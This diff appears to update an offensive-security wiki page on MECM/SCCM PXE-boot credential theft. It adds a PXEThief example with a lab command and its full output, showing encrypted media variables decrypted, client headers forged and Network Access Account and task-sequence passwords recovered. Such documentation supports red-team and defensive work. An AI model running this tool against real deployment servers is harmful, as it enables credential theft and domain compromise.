@@ -53,6 +53,78 @@ With these credentials, attackers may transition from an unauthenticated context
 
 
 ## Examples
+
+### PXEThief
+It is now possible to locate a PXE-enabled DP, download the encrypted media variables file, recover the certificate and management point URL from the variables file, and request and deobfuscate policy secrets in one command from a Linux box with this PR to PXEThief by Nic Losby [@Blurbdust](https://x.com/Blurbdust): https://github.com/MWR-CyberSec/PXEThief/pull/11
+```
+root@DEBIAN:/home/labadmin/PXEThief# python pxethief.py 2 192.168.57.50
+________  ___    ___ _______  _________  ___  ___  ___  _______   ________
+|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\
+\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/
+ \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\
+  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_|
+   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\
+    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|
+          |__|/ \|__|
+
+[+] Generating and downloading encrypted media variables file from MECM server located at 192.168.57.50
+[+] Using interface: eth0 - eth0
+[+] Targeting user-specified host: 192.168.57.50
+
+[+] Asking ConfigMgr for location to download the media variables and BCD files...
+
+/home/labadmin/PXEThief/env/lib/python3.10/site-packages/scapy/sendrecv.py:726: SyntaxWarning: 'iface' has no effect on L3 I/O sr1(). For multicast/link-local see https://scapy.readthedocs.io/en/latest/usage.html#multicast
+  warnings.warn(
+Begin emission
+
+Finished sending 1 packets
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+
+[!] Variables File Location: \SMSTemp\2024.10.18.16.34.38.0001.{F43C5F34-8623-40AA-88B1-875EED83DEDF}.boot.var
+[!] BCD File Location: \SMSTemp\2024.10.18.16.34.36.06.{F43C5F34-8623-40AA-88B1-875EED83DEDF}.boot.bcd
+[!] Blank password on PXE boot found!
+[!] Attempting automatic exploitation.
+[+] Media variables file to decrypt: 2024.10.18.16.34.38.0001.{F43C5F34-8623-40AA-88B1-875EED83DEDF}.boot.var
+[+] Password bytes provided: 0x5300fdfff1ffbdff75008cff42001c000a00a1ff
+[+] Successfully decrypted media variables file with the provided password!
+[!] Writing media variables to variables.xml
+[!] Writing _SMSTSMediaPFX to PS1_{09821541-3BE2-421C-AA13-D1E0AD_SMSTSMediaPFX.pfx. Certificate password is {09821541-3BE2-421C-AA13-D1E0AD
+[+] Identifying Management Point URL from media variables (Subsequent requests may fail if DNS does not resolve!)
+[+] Management Point URL set to: http://SITE-SERVER.APERTURE.LOCAL
+[+] Generating Client Authentication headers using PFX File...
+[+] CCMClientID Signature Generated
+[+] CCMClientTimestamp Signature Generated
+[+] ClientToken Signature Generated
+[+] Retrieving x64UnknownMachineGUID from MECM MP...
+[+] Requesting policy assignments from MP...
+[+] 47 policy assignment URLs found!
+[+] Requesting Network Access Account Configuration from: http://SITE-SERVER.APERTURE.LOCAL/SMS_MP/.sms_pol?{c6fe32fb-7e9c-4776-abe3-2a6d107447f1}.5_00
+[+] Requesting Task Sequence Configuration from: http://SITE-SERVER.APERTURE.LOCAL/SMS_MP/.sms_pol?PS120003-PS100009-6F6BCC28.1_00
+
+[+] Decrypting Network Access Account Configuration
+[+] Extracting password from Decrypted Network Access Account Configuration
+
+[!] Network Access Account Username: 'APERTURE\networkaccess'
+[!] Network Access Account Password: 'SuperSecretPassword'
+[!] Network Access Account Username: 'APERTURE\networkaccess'
+[!] Network Access Account Password: 'SuperSecretPassword'
+
+[+] Decrypting Task Sequence Configuration
+
+[!] Successfully Decrypted TS_Sequence XML Blob in Task Sequence 'Task Sequence 1'!
+[+] Attempting to automatically identify credentials in Task Sequence 'Task Sequence 1':
+
+[!] Possible credential fields found!
+
+In TS Step "Apply Windows Settings":
+OSDRegisteredUserName - admin
+OSDLocalAdminPassword - SuperSecretPassword
+
+In TS Step "Apply Network Settings":
+OSDJoinAccount - aperture\dja
+```
+
 ### Pxethiefy.py
 Using pxethiefy from a Linux machine with network access to retrieve a PXE media file with no password set:
 ```
@@ -103,3 +175,4 @@ testsubject4@sphere4:~$ python3 ./main.py 10.0.1.200 10.0.2.4 TS-HOST 9090
 - Carsten Sandker, [pxethiefy](https://github.com/csandker/pxethiefy)
 - Microsoft, [Understanding PXE Boot](https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/os-deployment/understand-pxe-boot#)
 - SpecterOps, [Cred1py](https://github.com/specterops/Cred1py)
+- Nic Losby, [PXEThief PR 11](https://github.com/MWR-CyberSec/PXEThief/pull/11)
